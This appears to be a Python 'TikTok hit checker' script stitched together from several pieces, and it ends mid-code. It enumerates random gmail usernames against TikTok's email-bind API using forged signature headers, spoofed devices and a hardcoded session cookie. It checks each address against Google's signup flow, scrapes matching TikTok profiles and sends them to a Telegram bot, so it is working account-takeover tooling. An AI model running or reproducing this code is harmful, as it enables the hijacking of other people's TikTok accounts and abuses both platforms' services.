import requests
import sys

TAKIP_URL = "https://raw.githubusercontent.com/BatuTeam28/lisanskontrol/main/NewTik.py"

def takip_kontrol():
    try:
        response = requests.get(TAKIP_URL, timeout=5)
        response.raise_for_status()
        durum = response.text.strip().upper()
        if durum == "KAPALI":
            print("\n[!] API KAPANDI, Program kapanıyor.")
            sys.exit()
        elif durum == "ACIK":
            print("\n[✓]  SÜRELİ API KULLANIYORSUN SINIRSIZ ALMAK İÇİN ~ @BatuX28.")
        else:
            print("\n[!] SÜRELİ API DURDU İLETİŞİM İÇİN ~ @BatuX28.")
            sys.exit()
    except Exception as e:
        print(f"\n[×] API’ye erişilemiyor: {e}")
        sys.exit()

if __name__ == "__main__":
    takip_kontrol()
    # Buraya toolunun devam eden ana kodu gelir
    print("Tool çalışıyor...")
import requests,re,random,os,sys
from rich import print as g
from rich.panel import Panel
from cfonts import render, say
from threading import Thread
R = '\033[1;31;40m'  
X = '\033[1;33;40m'  
F = '\033[1;32;40m'  
C = "\033[1;97;40m"  
C = "\033[1;97;40m"  
B = '\033[1;36;40m'  
K = '\033[1;35;40m'  
V = '\033[1;36;40m'  
a14 = '\x1b[38;5;153m'
a1 = '\x1b[1;31m'
a3 = '\x1b[1;32m' 
a9 = '\x1b[1;37m'
P = '\x1b[1;97m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'

print(f"\x1b[1;31m•{a9}" * 60)
oi = render('BATU      TIKTOK       VIP',
                        colors=['white', 'red'], align='center')
print(oi)
print(f"\x1b[1;31m•{a9}" * 60)
print(" ~ By : @BatuX28")
print(f"\x1b[1;31m•{a9}" * 60)

print(X + '')
nnn = random.choice([R,X,F,B,K,V])
good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]

import os
import requests
from requests import post as pp
import re
import random
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import requests
import threading
import random
import time,secrets,binascii,os,uuid
from urllib.parse import urlencode
try:
    import requests
    import random 
    import time
    import uuid
    import threading
except ImportError:
    os.system("pip install requests")
    os.system("pip install re")
    os.system("pip install random")
    os.system("pip install time")
    os.system("pip install uuid")
    os.system("pip install threading")
    os.system("pip install user_agent")
    os.system("pip install hashlib")
try:
    from MedoSigner import Argus,Gorgon, md5,Ladon
except:
    os.system('pip install MedoSigner')
    os.system('pip install cryptography')
    os.system('pip install pycryptodome')
    from MedoSigner import Argus,Gorgon, md5,Ladon
#-------------[]-------------        
gre = '\033[2;32m'
red = '\033[1;31m'
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
#-------------[]------------
token = input(red + '𝐓𝐎𝐊𝐄𝐍  : ')

idg= input(red + '𝐈𝐃 : ')
import secrets, requests, random, uuid, binascii, os, time, json
from urllib.parse import urlencode
from MedoSigner import Argus,Gorgon, md5,Ladon
def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}   
g=0
m=0
a=0

                 
def em_num(user):
    global token, idg
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
        }

        tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=headers).text
        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        country = str(info.split('region":"')[1]).split('",')[0]
        like = str(info.split('heart":')[1]).split(',"')[0]
        name = str(info.split('nickname":"')[1]).split('",')[0]
        followers = str(info.split('followerCount":')[1]).split(',"')[0]
        following = str(info.split('followingCount":')[1]).split(',"')[0]
        video = str(info.split('videoCount":')[1]).split(',"')[0]
        id = str(info.split('id":"')[1]).split('",')[0]
        private = str(info.split('privateAccount":')[1]).split(',"')[0]

        ff = f'''𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 🠊
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
❄  𝗡𝗮𝗺𝗲  : {name}
❄ 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : {user}
❄ 𝗘𝗺𝗮𝗶𝗹 : {user}@gmail.com
❄ 𝗟𝗶𝗸𝗲 : {like}
❄  Country : {country}
❄  𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers}
❄ 𝗳𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : {following}
❄  𝗜𝗗 : {id}
❄  𝗣𝗿𝗶𝘃𝗮𝘁𝗲  : {private}
❄ 𝗩𝗶𝗱𝗲𝗼 : {video}
❄ 𝗧𝗟𝗘 ➩ @BatuX28 ~ @BatuKumar_Bot • 
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
        '''
        
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, data={
            'chat_id': idg,
            'text': ff
        })

        with open('Hit.txt', 'a') as f:
            f.write(ff + '\n')

    except Exception as e:
        ff = f'''
𝐇𝐈𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
{user}
{user}@gmail.com🧸
══════════════════
        '''
        with open('BatuTiktok.txt', 'a') as f:
            f.write(ff + '\n')    	
a = 0


import requests,random
abc = 'azertyuiopmlkjhgfdsqwxcvbn'

def check_gmail1(email):
  if '@' in email:email=email.split('@')[0]
  s = requests.Session()
  while True:
    try:
      headers = {
          'accept': '*/*',
          'accept-language': 'en',
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'dnt': '1',
          'origin': 'https://accounts.google.com',
          'referer': 'https://accounts.google.com/',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
          'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
          'x-same-domain': '1',
      }
      params = {
    'biz': 'false',
    'continue': 'https://mail.google.com/mail/u/0/',
    'ddm': '1',
    'emr': '1',
    'flowEntry': 'SignUp',
    'flowName': 'GlifWebSignIn',
    'followup': 'https://mail.google.com/mail/u/0/',
    'osid': '1',
    'service': 'mail',
}
      response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
      TL = response.url.split('TL=')[1]
      at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':','%3A')
      s1 = str(response.text).split('"Qzxixc":"')[1].split('"')[0]
      headers.update({'x-goog-ext-391502476-jspb':'["{}"]'.format(s1)})
      break
    except:''
  while True:
    try:

      name = ''.join(random.choice(abc) for i in range(random.randrange(5,10)))
      params = {
          'rpcids': 'E815hb',
          'source-path': '/lifecycle/steps/signup/name',
          'hl': 'en-US',
          'TL': TL,
          'rt': 'c',
      }

      data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

      response = s.post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          headers=headers,
          data=data,
      )
      break
    except:''
  while True:
    try:
      params = {
          'rpcids': 'eOY7Bb',
          'source-path': '/lifecycle/steps/signup/birthdaygender',
          'hl': 'en-US',
          'TL': TL,
          'rt': 'c',
      }
      data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C5%2C20%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CpGhqaDACAAbe5ec5_uWNRGP8ADzN4FP0ADQBEArZ1Bi3KqRJ2jEufwzhM9DCOkC4py-Spwe8Dm8vIGEUYahQ0cFE1MsIiaW04C_7CxtFzQAAAladAAAAC6cBB7EATZbZc1lblBs3Pyjn18zoKs0dzS4aUpxAwryVbv8iPsaM1XfBJCrUEYx0hOeeUpwbG0Hh59jAFDOul1Q_nXL2xdN3okPfS1tlHQRMBJkUVg39qy9DpG6iLGbC4D3MlzWYexF_GQc5fwWVzu6zeexxryAR74fHHwp0x0VOHm6vsiReDmPuSJw-gea4iEzzhe0QA2CCW_YekjZ0Qu3W544ixt8rdoYcsk8Jx21EFQ2k8f_vdzbtHtdhYJl2In3oIPKXLAuFtsQmkrO0x0myDa_sbuNf8EPswGx_xGrBNciJwrVAVt8jmaK1kncj4VeueZn8pvlElhCpvVkyxFaJdlklKjKbvq4AGdu65_wFWX-nSbvq_EujfCGd1jF2uVxfx9GxGCkETqWFX2TItzMYOygG39N3e0u9zxG2rR9WxO1EKw-wOv_T_Nyc9UuV4oeTCC9s66OE7HyvcZn17B58qzplRRM6xOPKqaAL6blvAlAmsDvujYBUGZmXO4558-0rCrIF6_tyceib3scY62d_lGyGe-qLvMwRJ0a3JOo_r9S2vq15Pt6VATO-nzhs2mpk-K7_A6r9PC9KMxgktD_q7y9lhF_Hd1Hb92Rz2OgzCwuat9LnEIA6rNkoJ5Ev52PFtblk-NNHz3RmX_wLZ86pYeUgMfVTTlOBEQBodV97FHO_QV-4BtwPST0xe9P3zkAEiuFYf4KFwjj131Icb_a8sX_Rd9_ebfpRfvb76EWJyTfnW7WCTzyph22-lFrMnPcGK92FOUod62lZFoEy84QzevvX311QwdDuJWdqPwmvBEHMYpfW5yKlrxOr4f8i2DimNkRq2MiDbsW2ZnnnXhKzBAQgYghjSaAJ3ofdFhfE5yBWynv3IVxW_rEgpE7CYAPopkWqZUVsBtH0FA8o08ZSvmlt0p-thgwYQgJHmiWtTyMek5c_cSdoN5cqLk-JxOL2XBE68aPGC1JKyFCACcDCNnJR3DzncD1ZS4lchyFPsKyyalMzWp53CNH2aeoKLAdHyVz8TgpM56GcO1PpWKYzu0882T-AWvCaZEKqi9Qyb8fvCLFaxlzMGVEvCn2dU2q5LBNxJ0VsjljtR_aqLSEQ4tx5EITA5cyYA1-S_rQtDuCvCGC1-fDf8bsAckU7RNMh5pKZlXvzhlnHTnex6r6CaI7EnqUkw-NcuZpqq65s2o_4CnS23t5EAY7hTcBseN9h1eFkse2KnNDou38FjETsJpb6Fy1mLu-yzQ0tD152f39v9RVEUP4oMFLJO76O899vkgxxL3rQLk8EGXQDqaFjN5busj4VOhI6NIjqf1i9K0gKaBoHGSHG3gBqkXYXygJeiy_f8J2-VeG44bwNZl_m5P6L-Ce8c91zzZswM1MhPZqnz8_JUW-2LcBw5fNFDnQQ-fynszm4WY8F3PXxhdEoaun9xLOtqIeR8GPXPadPdE13RsBQdSibk6pw7ixPqieKkUbFD5wIKTD_UZf8tO0vc2QWH_5gHSSX-WjIoOEXHYWgUQt99fCXNTx1P8XL27N4CDgYR82-9QENXeP7qPAYBfcnWrtkvlRC8aRyxoMA_xS8BpYtsb5nKu1H6n4Mk4wgf0MZLIgC5E__IJy4ojRBCbBwams04rUlXWyB2llJ0Lo4SunQffsLiQqGxhMzhkwStuPgv7BHXY-kDPLyZXx-cewDw9ZjhvtJPpK6nW873_WkIO542o7kF_oNZRlE3pyLbdOabPG11KCjMIZgBEVpdzPssPPu6TXvh6F6_klPozrjf35DsktV7c-c3a2OVPKoYJtcQnwCA4UnHqR_i1-N1wxlooGJ6GUBI7H8wZmj_B2jjvqFWOfdLB8_bDmEysG_brczvsnyl-mGwipdMHPRZ70HpyGOign0Rg8JAQrVOnKH_oXkFjPmzGM3vXNOJ2tndrE9Z2isXvs_RPGpgUDiNbNYyJjLCmHJWz4mvyo5DrtANi-5qifEMEdrM9kxWKolh6meQd8Vx8Z61zQR5oQSu_V6lafpELV_fK7tZSHfRwlBAxx26rZaTXDI1yxSPk9Pmt_lfPiecmlRa43bCZQVPmj3rf0nQJf3_I8rUmFv4IemINkUEZBtVVBHIjJusuRI49-zoQMp1UsmbMiL17F1_sTwibBEvk2LjbF9Jo7HbGTqtLzZ0oLButszorJ4Hp0fq9GL4tJoMT2wbACAycYSvl-9LGX8JtYoMOkKnqLg3oRCRbeitDMAaQCSuGxSUCjTxkfAD_UCs3pBPvC3jYk5sK-SuKKIO48qJ_p8AYQkFutKtclzf2-P-SQozeuQYLpf5Ch2WtFpmm40DQ58SZ8OTxzMubG_q5K1t2ZsknjqnOMfzegagfp2_Lbm2ReTba9jJdH2EZ1zSoDyMV73O1NeSG8MCfBqqtjvevUtXq1T21l-f2Pcj_KYZ09uk50rTdkbDKXJ65Rr8EaLUVYveJ6Mcc7n740N7x-v8P3VUUYjNHDlbJbrWZ7J7PvfreGCZw7_jZDHd2_Fw5NvuJH7UXnrqEVzT3xvT8Wavpj1OCTyA0ItJPrSFo3JsvBWNsKaP0F34uSxlwpteTqzORTNjxN4QaGWFpzapvX3IYCkADk8iv3Oqm3OYtwtBW6Wm8ezJoySogZME2BHlcOLIajHAPR0isdLwXXSD9dzPO_zsfKB8Q7zM9DN-xwM9mQsQrsRCTq_cUjWxiqfonxFDIZx-UT5ez-U1az-JcfIwhlCtgiRt3s88omlG7znGNZSzu9V6P3szV5oT4ydTH1wQILd50eteZxhj4z7n0QbN5NUBd9nxK5NVYMs96NuwS7ZTOJB-fd_kr85giz0Om6_CY7CGhRwAM14oPpwNeyFQWsKpXOWR3huLTGQX3iFaspc_-F-UcYbA01_gafjo9sQqjn5oYrRVRIMu1pSzlYhfFWny0RoDWIEA-2eC3xjxrYWQASloqsyDUBetIuECA3Cr5BfQj-vcBa8GmQqjUGRJ1UxreLUrtoE9K7-BUkTSqfC6_ItIp8w7SXKnD4HImqa3NMvy6tqzHhNcrdhyAsNqnQG-by00SLuBMz2eHe49gTNyBiDrIjDzUYjieEn7X8DW8Z-QKdkJ3up_h5Q4XO9MkQ0pSi-YLVpkq7BBg_tUpwzOsQyhmVqm6gIZ6zDWIsc9iEkXzROe-aHxVwPsVSOUFXuDgCHQC7PqXl_ZkfA6XoOANg6mnqDJwKmE48pDHHq11tln2yGy0sDoN7et3FGFUV5nKEhUvkDq-FX-h1vBUKFpb5wdpiENT5Bz77GyiKHK8TwvFHZTUl6jgjIhYPYscylYG1U-_38hDBDxcNeCToG1ytkEqJMBLvBj0Q0iVeehPzzxFEYYZDhupE2wjgdp_RfOhqp30fRWBNSRk-XuAb-Ruasj7q6GHSm5ih2ukiloyRWBbr9QtTuOL_6LCvP_2-0yo18mMM1Az3jsmgDZHJGYPnE8LArBa2icMHRWdI1I5W_g45CaPogPMNMbRQZCvsGJJb6vwHa_4V69uB-FIjZxEoJwS8n10nRyAzxhedAp0udy3hYy43vNGg5CYgwNq8hFBqirHq3gRnh_fwzuAl56QHlvSD9clH6mgZbGLyz3-RlbLDRUGE7ev8GR-OQ0gxA2pBhRIQOl_DuHvWS_fshRRtTGXRkxZCv2X3lz6y7hMtztBPQ06LdIb0WaIkQgjJvwEthghzRWLUlkNd5wiC6tpRHQ9yWcnyQMgX13KFDWVa8sGoVyil_Wyxn1jfqbuCnuJdkdQhg72zZ5uFxtw8eH1Mgf8ab-n6LMLUbNCsbS7cz26IV-qmsIJA-m4b9AVZMPTgprpJwWUY3JYPqesT1zeoi4ZnDCYFCXlANT4NYI3a9hX--e7SsHcYGsddaq6HrP894ffqXbfyJ5J3n5fX8UHMu4aMe9Qa43Sw8eNfXPgewGtz34AIesPXDBPcVnS3-xdoK3K6gxqu8xc-hHt6Fo8Swb7cgV7HwQ9V2qpWc3P9XsGwGjVBpM6K-x30vqW9Kw89tLPAWEOlctJ8YGMFG_fujAVNN61GpvjfTcOzIaIIxLQjMkF89TQd3XE4ncgabEhbzjIS5SUVqSi3aG5wGdQ-vB_PYGDS3xonKccgoLg_UPeDnKuFHhoPDWq9P6IJQVagPLfuzzI76f8Rj3dJH3LnDlIVPcNwlHpX-YmYCniKytU5dQnX0AWLlQy_1z77IHhWU63yrQyoMU9iky4FUaeeJsLgx3XpVpR9PjhAGCFqUrr0ykCTpgADyyrNLs62wxVw-3bA0QsBca6LfD6eKCsWUHKRuhIKzy5I9S5XQ66WhHfNcPB7XbtdsQOBMBlB0v8gM5EKjNAic56B5Jb39ILbd_WT7xywRe9If-rXg9fHnGTApfNJKKMFsRr18Twkp11HFqV5M3Eg4oClga9aVvnwd751J4hLAWdo9bep0GS8pyX_SLQOM0dqpg6kANBYlpEczBWa_gCVdfpVOvOsp5GyoQHiHZVcu8p4fmXUd60LkmjyO4fMhqHtjnQjKXJorpNcCQK8w-RjcBw8Z7liV4zZts52-J5jfrXrDd2236i6OhNDlMqb6evHStjjJcc7jKqxnQ17A1wklO68gB8st3OuFPPiJXlnczSKJOyji0BVGPQUKztyJSlz-hcKWUgHLDoyYm34SrhDurlt-pcKA5MyHHRIH5nC6wFm6orlLD5OwoKyXfB48ylnPm2gDmDvdtctEDpXy3Qa-ZILfv7rCQkTFvef2qbdvxFwpGMoP_AyX5Ah8muwu8TYVlf63HWqIzev6tM1fOUAmadvdcjqhp5GTMbm5ewqWBzQNdjU5GjQLBkvQv2yRxFmkyvwr77rvCbgcaP6FLNFG1kI8RKh1E6HoCZnsCB7MVQptShtbtuSljBcxZ50%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(random.randrange(1990,2007),at)

      response = s.post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          headers=headers,
          data=data,
      )
      break
    except:''
  while True:
    try:

      params = {
          'rpcids': 'NHJMOd',
          'source-path': '/lifecycle/steps/signup/username',
          'hl': 'en-US',
          'TL': TL,
          'rt': 'c',
      }

      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C236841%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

      response = s.post(
          'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
          params=params,
          headers=headers,
          data=data,
      ).text
      if 'password' in response:
        return True
      else:
        return False
    except:''

def check_gmail(email):
    global a,m,g
    if '@' in email:email=email.split('@')[0]
    if check_gmail1(email) == True:
        g+=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{X}═══════════════════	
{gre}[=] Hits : {C1}{g}
{J22}[=] Bad Tiktok : {J21}{m}
{P1}[=] Good Tiktok : {J22}{a}
{X}═══════════════════'''
                 )
        em_num(email)
    else:
        a+=1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{X}═══════════════════	
{gre}[=] Hits : {C1}{g}
{J22}[=] Bad Tiktok : {J21}{m}
{P1}[=] Good Tiktok : {J22}{a}
{X}═══════════════════'''
		      		)
import requests
import threading
import random
import time,secrets,binascii,os,uuid
from urllib.parse import urlencode
from MedoSigner import Argus,Gorgon, md5,Ladon
def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}
secret = secrets.token_hex(16)
session = requests.Session()
def para():
	global session,secret
	cookies ={
        "passport_csrf_token": secret,
        "passport_csrf_token_default": secret,
        "sessionid":"f066a3a5c537ed36b7e71ab9ef4bd660"
      }
	session.cookies.update(cookies)
	device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
	device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
	regions = ["AE", "IQ", "US", "FR", "DE"]
	languages = ["ar", "en", "fr", "de"]
	params = {
    'passport-sdk-version': "6030790",
    'iid': str(random.randint(1, 10**19)),
    'device_id': str(random.randint(1, 10**19)),
    'ac': "WIFI",
    'channel': "googleplay",
    'aid': "1233",
    'app_name': "musical_ly",
    'version_code': "360505",
    'version_name': "36.5.5",
    'device_platform': "android",
    'os': "android",
    'ab_version': "36.5.5",
    'ssmix': "a",
    'device_type': random.choice(device_types),
    'device_brand': random.choice(device_brands),
    'language': random.choice(languages),
    'os_api': str(random.randint(28, 34)),
    'os_version': str(random.randint(10, 14)),
    'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
    'manifest_version_code': "2023605050",
    'resolution': "1440*2969",
    'dpi': str(random.choice([420, 480, 532])),
    'update_version_code': "2023605050",
    '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
    'is_pad': "0",
    'app_type': "normal",
    'sys_region': random.choice(regions),
    'last_install_time': str(random.randint(1600000000, 1700000000)),
    'mcc_mnc': "41820",
    'timezone_name': "Asia/Baghdad",
    'carrier_region_v2': "418",
    'app_language': random.choice(languages),
    'carrier_region': random.choice(regions),
    'ac2': "wifi",
    'uoo': "0",
    'op_region': random.choice(regions),
    'timezone_offset': str(random.randint(0, 14400)),
    'build_number': "36.5.5",
    'host_abi': "arm64-v8a",
    'locale': random.choice(languages),
    'region': random.choice(regions),
    'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
    'cdid': str(uuid.uuid4()),
    'support_webview': "1",
    'reg_store_region': random.choice(regions).lower(),
    'user_selected_region': "0",
    'cronet_version': "1c651b66_2024-08-30",
    'ttnet_version': "4.2.195.8-tiktok",
    'use_store_region_cookie': "1"
}
	device_type = params["device_type"]
	return params
def headd():
    global session,secret
    pp=para()
    m=sign(params=urlencode(pp),payload="",cookie="")
    device_type = pp["device_type"]
    app_name = "com.zhiliaoapp.musically"
    app_version = f"{random.randint(2000000000, 3000000000)}"
    platform = "Linux"
    os = f"Android {random.randint(10, 15)}"
    locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
    locale = random.choice(locales)
    device_types = ["phone", "tablet", "tv"]
    device_type = random.choice(device_types)
    build = f"UP1A.{random.randint(200000000, 300000000)}"
    cronet_version = f"{random.randint(10000000, 20000000)}"
    cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
    quic_version = f"{random.randint(10000000, 20000000)}"
    quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"

    user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                  f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                  f"QuicVersion:{quic_version} {quic_date})")

    headers = {
          'User-Agent': user_agent,
          'x-tt-passport-csrf-token': secret,
          'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
          'x-argus': m["x-argus"],
          'x-gorgon': m["x-gorgon"],
          'x-khronos': m["x-khronos"],
          'x-ladon': m["x-ladon"],
      }
    return headers,pp
a=0
def req(em):
    email = em + '@gmail.com'
    global session,a,m,g
    headers,params = headd()
    try:
            url = "https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
            payload =f"rules_version=v2&account_sdk_source=app&email_source=1&mix_mode=1&passport_ticket=PPTSGOSAYQ95DDATX2PENDFADNXDTNSTPZC4JU&multi_login=1&type=32&email={email}&email_theme=2"
            response = session.post(url, params=params, headers=headers,data=payload)
            re=(response.text)
            a+=1
            if "1023" in re:
            	check_gmail(email)
            elif "1007" in re:
            	m+=1
            	os.system('cls' if os.name == 'nt' else 'clear')
            	print(f'''
{X}═══════════════════	
{gre}[=] Hits : {C1}{g}
{J22}[=] Bad Tiktok : {J21}{m}
{P1}[=] Good Tiktok : {J22}{a}
{X}═══════════════════'''
		      		)
            else:
            	print(re)
    except requests.exceptions.RequestException as e:
            headers,params = headd()            		      		

import os    
from random import randrange
import requests ,random
from uuid import uuid4

def hso1():
        while True:
            try:
                g=random.choice(
            [
'ğüişöçñäüğüişöçñäüğüişöçñäüqw.ertyuiopasdfghjklzxcvbnm',
'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',

            ]

        )

                keyword=''.join((random.choice(g) for i in range(random.randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                #print(ttwid)
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': he3["User-Agent"],
                }


                params = {
                    'WebIdLastTime': '1715883147',
                    'aid': '1988',
                    'app_language': 'en',
                    'app_name': 'tiktok_web',
                    'browser_language': 'en-US',
                    'browser_name': 'Mozilla',
                    'browser_online': 'true',
                    'browser_platform': 'Win32',
                    'browser_version': he3["User-Agent"],
                    'channel': 'tiktok_web',
                    'cookie_enabled': 'true',
                   'cursor': '220',
                    'data_collection_enabled': 'false',
                    'device_id': idd6,
                    'device_platform': 'web_pc',
                    'focus_state': 'true',
                    'from_page': 'search',
                    'history_len': '5',
                    'is_fullscreen': 'false',
                    'is_page_visible': 'true',
                    'keyword': f'{keyword}',
                    'odinId': '7369661640164000774',
                    'os': 'windows',
                    'priority_region': '',
                    'referer': '',
                   'region': 'PE',
                    'screen_height': '864',
                    'screen_width': '1536',
                    'search_id': '20240801154310BA7846F9CDEDD312B464',
                    'tz_name': 'Asia/Baghdad',
                    'user_is_login': 'false',
                    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
                    'webcast_language': 'en',
                   'msToken': msToken,
                    'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
